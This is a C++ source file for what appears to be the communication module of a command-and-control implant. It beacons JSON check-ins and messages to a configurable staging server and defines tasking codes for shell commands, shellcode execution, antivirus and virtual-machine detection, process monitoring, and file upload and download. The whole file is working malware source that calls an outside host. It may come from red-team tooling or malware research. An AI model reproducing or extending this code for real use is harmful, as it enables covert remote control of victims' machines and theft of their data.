#include "stdafx.h"
#include "AgentSend.h"
#include "AgentHTTP.h"



bool AgentSend::resetSendJson()
{
	/*
	This function resets to the defualt
	JSON object. This will helps after a command
	or function has been set.

	The default struc looks like:
	{
	"agentId" : 23122342323
	"requestCode" : "05"
	}
	*/
	//agentLog.memoryLog(0, "resetSendJson() agentSendJson reset to defualt
	agentSendJson.clear();
	agentSendJson["agentId"] = agentJson["agentId"];
	agentSendJson["requestCode"] = 05;
	return true;

}

bool AgentSend::sendMessage(int requestCode, std::string message, std::string type)
{
	/*
	This function resets to the defualt
	JSON object. This will helps after a command
	or function has been set.

	The default struc looks like:
	{
	"agentId" : 23122342323
	"requestCode" : "05"
	}
	*/
	//agentLog.memoryLog(0, "sendMessage() initiated");
	agentSendJson["requestCode"] = requestCode;
	agentSendJson["dataType"] = type;
	agentSendJson["message"] = message;
	AgentHTTP http;
	LPCWSTR stageServer;
	LPCWSTR stageGetUri;
	LPCWSTR stageKey;
	const std::wstring s = agentJson["agentServer"]["stageServer"];
	stageServer = (LPCWSTR)s.c_str();
	const std::wstring s2 = agentJson["agentServer"]["stagePostUri"];
	const std::wstring s3 = agentJson["agentServer"]["stageKey"];
	const std::wstring s4 = s2 + s3;
	stageGetUri = (LPCWSTR)s4.c_str();
	// build api request
	std::string sendPayload = agentSendJson.dump();
	int payloadSize = sendPayload.length();
	http.HttpPost(stageServer, stageGetUri, sendPayload, payloadSize);
	// reset the JSON object
	AgentSend::resetSendJson();

	return true;
}

bool AgentSend::sendCheckinMessage()
{
	/*
	This function sends the server the checkin
	message for "Alive"
	{
	"agentId" : 23122342323
	"requestCode" : "05"
	}
	*/
	//agentLog.memoryLog(0, "sendMessage() initiated");
	agentSendJson["agentId"] = agentJson["agentId"];
	agentSendJson["requestCode"] = agentCodes["agentCheckin"];
	std::string sendPayload = agentSendJson.dump();
	AgentHTTP http;
	LPCWSTR stageServer;
	LPCWSTR stageGetUri;
	LPCWSTR stageKey;
	const std::wstring s = agentJson["agentServer"]["stageServer"];
	stageServer = (LPCWSTR)s.c_str();
	const std::wstring s2 = agentJson["agentServer"]["stageGetUri"];
	const std::wstring s3 = agentJson["agentServer"]["stageKey"];
	const std::wstring s4 = s2 + s3;
	stageGetUri = (LPCWSTR)s4.c_str();
	// build api request
	int payloadSize = sendPayload.length();
	std::string returnResult = http.HttpRequest(stageServer, stageGetUri, sendPayload, payloadSize);
	agentReturnJson = json::parse(returnResult);
	// return the result for procesing 
	// reset the JSON object
	AgentSend::resetSendJson();
	return true;
}


void AgentSend::setAgentCodes()
{
	/*
	Take in a string value
	and convert it to the proper
	request code agent tasking.
	00 = exit agent
	01 = set sleep time
	02 = set jitter time
	03 = set killdate
	04 = set lost limit
	05 = agent checkin

	10 = set stage server
	11 = set stage key
	12 = set stageGetUri
	13 = set stagePostUri

	20 = run shell command
	21 = run av detect
	22 = run vmware detect
	23 = run ps list
	24 = run shell code exec
	25 = run file find
	26 = run WmiProcQuery
	27 = run WmiProcMon

	30 = download file
	31 = upload file

	50 = return agent JSON settings
	51 = set agent panic level
	52 = DeepFreeze agent
	*/
	agentCodes["exitAgent"] = 00;
	agentCodes["setSleep"] = 01;
	agentCodes["setJitter"] = 02;
	agentCodes["setKillDate"] = 03;
	agentCodes["setLostLimit"] = 04;
	agentCodes["agentCheckin"] = 05;
	agentCodes["setStageServer"] = 10;
	agentCodes["setStageUri"] = 11;
	agentCodes["stageGetUri"] = 12;
	agentCodes["stagePostUri"] = 13;
	agentCodes["runShellCmd"] = 20;
	agentCodes["runAvDet"] = 21;
	agentCodes["runVmwareDet"] = 22;
	agentCodes["runPsList"] = 23;
	agentCodes["runShellCodeExec"] = 24;
	agentCodes["runFilefind"] = 25;
	agentCodes["runWmiProcQuery"] = 26;
	agentCodes["runWmiProcMon"] = 27;
	agentCodes["downloadFile"] = 30;
	agentCodes["uploadFile"] = 31;
	agentCodes["agentJson"] = 50;
	agentCodes["setAgentPanic"] = 51;
	agentCodes["setDeepFreeze"] = 52;

}